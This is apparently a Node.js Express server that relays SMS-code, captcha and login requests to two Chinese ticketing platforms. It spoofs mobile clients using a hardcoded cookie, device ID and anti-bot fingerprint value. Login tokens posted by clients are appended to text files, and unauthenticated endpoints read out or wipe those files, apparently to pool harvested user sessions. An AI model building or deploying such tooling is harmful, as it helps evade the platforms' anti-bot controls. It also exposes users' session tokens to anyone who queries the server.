import fs from 'fs'
import express from 'express'
import axios from 'axios';
import cors from 'cors'
import qrcode from 'qrcode'
import path from 'path'

const app = express();
const port = 80;

// 解析JSON请求体
app.use(express.json());
app.use(cors());

// 定义POST接口
app.post('/submit', (req, res) => {
    const data = req.body;
    // 处理接收到的数据
    console.log('Received data:', data);
    fs.appendFileSync('data.txt', `${JSON.stringify(data.token)},\n`, 'utf8', function (err) {
        if (err) {
            console.error(err);
            res.end('Error writing file');
        } else {
            res.end('Data received');
        }
    });

    // 返回响应
    res.status(200).send({
        comments: "成功",
        statusCode: 200
    });
});

app.post('/getCode', async (req, res) => {
    const data = req.body;
    try {
        const response = await axios({
            headers: {
                'Content-Type': 'application/json',
                'src': 'WEB',
                'Referer': 'https://63739735004701000156623a.caiyicloud.com/login',
                'terminal-src': 'WEB',
                'access-token': '',
                'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1',
                'ver': '4.1.2-20240305183007'
            },
            method: 'post',
            url: 'https://63739735004701000156623a.caiyicloud.com/cyy_gatewayapi/user/pub/v3/send_verify_code',
            data: JSON.stringify({
                'src': 'WEB',
                'ver': '4.1.2-20240305183007',
                'verifyCodeUseType': 'USER_LOGIN',
                'cellphone': data.phone,
                'messageType': 'MOBILE',
                'token': data.token
            }),
        })
        res.json(response.data);
    } catch (error) {
        res.status(500).json({ error: 'Failed to fetch data from the target server' });
    }
})

app.post('/photo', async (req, res) => {
    const data = req.body;
    try {
        const response = await axios({
            headers: {
                'Accept': '*/*',
                'Accept-Language': 'zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7',
                'Connection': 'keep-alive',
                'Content-Type': 'application/json',
                'Cookie': 'sensorsdata2015jssdkcross=%7B%22distinct_id%22%3A%2261927327aa62f50fee59b1aa%22%2C%22first_id%22%3A%2218df951b5a367e-04f02096947915-296e4933-400760-18df951b5a423d0%22%2C%22props%22%3A%7B%22%24latest_traffic_source_type%22%3A%22%E7%9B%B4%E6%8E%A5%E6%B5%81%E9%87%8F%22%2C%22%24latest_search_keyword%22%3A%22%E6%9C%AA%E5%8F%96%E5%88%B0%E5%80%BC_%E7%9B%B4%E6%8E%A5%E6%89%93%E5%BC%80%22%2C%22%24latest_referrer%22%3A%22%22%2C%22platform%22%3A%22H5%22%2C%22merchantDomain%22%3A%2262396a68ed218560363ff18c.caiyicloud.com%22%2C%22product%22%3A%22CYY%22%7D%2C%22identities%22%3A%22eyIkaWRlbnRpdHlfY29va2llX2lkIjoiMThkZjk1MWI1YTM2N2UtMDRmMDIwOTY5NDc5MTUtMjk2ZTQ5MzMtNDAwNzYwLTE4ZGY5NTFiNWE0MjNkMCIsIiRpZGVudGl0eV9sb2dpbl9pZCI6IjYxOTI3MzI3YWE2MmY1MGZlZTU5YjFhYSJ9%22%2C%22history_login_id%22%3A%7B%22name%22%3A%22%24identity_login_id%22%2C%22value%22%3A%2261927327aa62f50fee59b1aa%22%7D%2C%22%24device_id%22%3A%2218df951b5a367e-04f02096947915-296e4933-400760-18df951b5a423d0%22%7D; acw_tc=76b20ff617103164444632627e6f10f68dedccc4ba626c8c275e82340a6e75',
                'Origin': 'https://63739735004701000156623a.caiyicloud.com',
                'Referer': 'https://63739735004701000156623a.caiyicloud.com/login',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-origin',
                'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1',
                'access-token': '',
                'src': 'H5',
                'terminal-src': 'H5',
                'ver': '4.1.2-20240305183007'
            },
            method: 'post',
            url: 'https://63739735004701000156623a.caiyicloud.com/cyy_gatewayapi/user/pub/v3/generate_photo_code',
            data: JSON.stringify({
                'src': 'H5',
                'ver': '4.1.2-20240305183007',
                'cellphone': data.phone,
                'verifyCodeUseType': 'USER_LOGIN',
                'messageType': 'MOBILE'
            }),
        })
        res.json(response.data);
    } catch (error) {
        res.status(500).json({ error: 'Failed to fetch data from the target server' });
    }
})

app.post('/login', async (req, res) => {
    const data = req.body;
    try {
        const response = await axios({
            headers: {
                'Accept': '*/*',
                'Accept-Language': 'zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7',
                'Connection': 'keep-alive',
                'Content-Type': 'application/json',
                'Cookie': 'sensorsdata2015jssdkcross=%7B%22distinct_id%22%3A%2261927327aa62f50fee59b1aa%22%2C%22first_id%22%3A%2218df951b5a367e-04f02096947915-296e4933-400760-18df951b5a423d0%22%2C%22props%22%3A%7B%22%24latest_traffic_source_type%22%3A%22%E7%9B%B4%E6%8E%A5%E6%B5%81%E9%87%8F%22%2C%22%24latest_search_keyword%22%3A%22%E6%9C%AA%E5%8F%96%E5%88%B0%E5%80%BC_%E7%9B%B4%E6%8E%A5%E6%89%93%E5%BC%80%22%2C%22%24latest_referrer%22%3A%22%22%2C%22platform%22%3A%22H5%22%2C%22merchantDomain%22%3A%2262396a68ed218560363ff18c.caiyicloud.com%22%2C%22product%22%3A%22CYY%22%7D%2C%22identities%22%3A%22eyIkaWRlbnRpdHlfY29va2llX2lkIjoiMThkZjk1MWI1YTM2N2UtMDRmMDIwOTY5NDc5MTUtMjk2ZTQ5MzMtNDAwNzYwLTE4ZGY5NTFiNWE0MjNkMCIsIiRpZGVudGl0eV9sb2dpbl9pZCI6IjYxOTI3MzI3YWE2MmY1MGZlZTU5YjFhYSJ9%22%2C%22history_login_id%22%3A%7B%22name%22%3A%22%24identity_login_id%22%2C%22value%22%3A%2261927327aa62f50fee59b1aa%22%7D%2C%22%24device_id%22%3A%2218df951b5a367e-04f02096947915-296e4933-400760-18df951b5a423d0%22%7D; acw_tc=76b20ff617103164444632627e6f10f68dedccc4ba626c8c275e82340a6e75',
                'Origin': 'https://63739735004701000156623a.caiyicloud.com',
                'Referer': 'https://63739735004701000156623a.caiyicloud.com/login',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-origin',
                'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1',
                'access-token': '',
                'src': 'H5',
                'terminal-src': 'H5',
                'ver': '4.1.2-20240305183007'
            },
            method: 'post',
            url: 'https://63739735004701000156623a.caiyicloud.com/cyy_gatewayapi/user/pub/v3/login_or_register',
            data: JSON.stringify({
                'src': 'H5',
                'ver': '4.1.2-20240305183007',
                'cellphone': data.phone,
                'verifyCode': data.code
            }),
        })
        res.json(response.data);
        // res.status(200).send('Data received successfully.');
    } catch (error) {
        res.status(500).json({ error: 'Failed to fetch data from the target server' });
    }
})

app.get('/read-file', (req, res) => {
    const filePath = './data.txt'; // 本地文件路径
    fs.readFile(filePath, 'utf8', (err, data) => {
        if (err) {
            res.status(500).send({
                msg: '错误文件'
            });
            return;
        }
        //   const linesArray = data.replace('\n', '');
        res.status(200).send(data);
    });
})

app.get('/clear-file', (req, res) => {
    const filePath = './data.txt'; // 指定文件路径
    fs.truncate(filePath, 0, function (err) {
        if (err) {
            console.error(err);
            res.status(500).send('Error clearing file contents.');
        } else {
            res.status(200).send({
                comments: "成功",
                statusCode: 200
            });
        }
    });
})

app.post('/phone-fwd', async (req, res) => {
    const data = req.body;
    try {
        const response = await axios.post(
            'https://api.livelab.com.cn/thirdParty/sms/app/captcha',
            new URLSearchParams({
                'phone': data.phone,
                'type': '1'
            }),
            {
                headers: {
                    'user-agent': 'Dart/2.19 (dart:io)',
                    'content-type': 'application/x-www-form-urlencoded;charset=utf-8'
                }
            }
        )
        res.json(response.data);
    } catch (error) {
        res.status(500).json({ error: 'Failed to fetch data from the target server' });
    }
})

app.get('/read-fwd', (req, res) => {
    const filePath = './fwd.txt'; // 本地文件路径
    fs.readFile(filePath, 'utf8', (err, data) => {
        if (err) {
            res.status(500).send({
                msg: '错误文件'
            });
            return;
        }
        //   const linesArray = data.replace('\n', '');
        res.status(200).send(data);
    });
})

app.post('/login-fwd', async (req, res) => {
    const data = req.body;
    try {
        const response = await axios.post(
            'https://api.livelab.com.cn/auth/app/login/phoneCaptcha',
            `phone=${data.phone}&captcha=${data.code}&sekyCaptcha&deviceId=AC39A967-C95E-4293-9964-585A7503A29E&deviceType=1&blackBox=qIPHa1711861510JpDdaMpOl08`,
            {
                headers: {
                    'user-agent': 'Dart/2.19 (dart:io)',
                    'content-type': 'application/x-www-form-urlencoded;charset=utf-8'
                }
            }
        )
        res.json(response.data);
    } catch (error) {
        res.status(500).json({ error: 'Failed to fetch data from the target server' });
    }
})

app.post('/submit-fwd', (req, res) => {
    const data = req.body;
    // 处理接收到的数据
    console.log('Received data:', data);
    fs.appendFileSync('fwd.txt', `${JSON.stringify(data.token)},\n`, 'utf8', function (err) {
        if (err) {
            console.error(err);
            res.end('Error writing file');
        } else {
            res.end('Data received');
        }
    });

    // 返回响应
    res.status(200).send({
        comments: "成功",
        statusCode: 200
    });
});

app.get('/qrcode', async (req, res) => {
    const text = req.query.text; // 获取URL参数中的text值
    try {
        const image = await qrcode.toDataURL(text); // 生成二维码
        res.send({ status: 'success', image }); // 返回二维码图片
    } catch (error) {
        res.status(500).send({ status: 'error', message: error.message }); // 发生错误时返回
    }
})

// 数据文件路径
const dataFilePath = path.join('./data.json');

// 初始化数据数组
let data = [];

// 从文件加载数据（如果文件存在）
if (fs.existsSync(dataFilePath)) {
    data = JSON.parse(fs.readFileSync(dataFilePath, 'utf8'));
}


app.get('/get-source', (req, res) => {
    res.send(data);
})

app.post('/add-source', (req,res) => {
    const newItem = req.body;
    data.push(newItem);
    saveDataToFile();
    res.status(200).send(newItem);
})

function saveDataToFile() {
    fs.writeFileSync(dataFilePath, JSON.stringify(data), 'utf8');
}

app.get('/clear-fwd', (req, res) => {
    const filePath = './data.json'; // 指定文件路径
    fs.truncate(filePath, 0);
    fs.writeFileSync(filePath, JSON.stringify([]), 'utf8');
    const filePaths = './fwd.txt'; // 指定文件路径
    fs.truncate(filePaths, 0, function (err) {
        if (err) {
            console.error(err);
            res.status(500).send('Error clearing file contents.');
        } else {
            res.status(200).send({
                comments: "成功",
                statusCode: 200
            });
        }
    });
})


// 启动服务器
app.listen(port, () => {
    console.log(`Server listening at http://localhost:${port}`);
});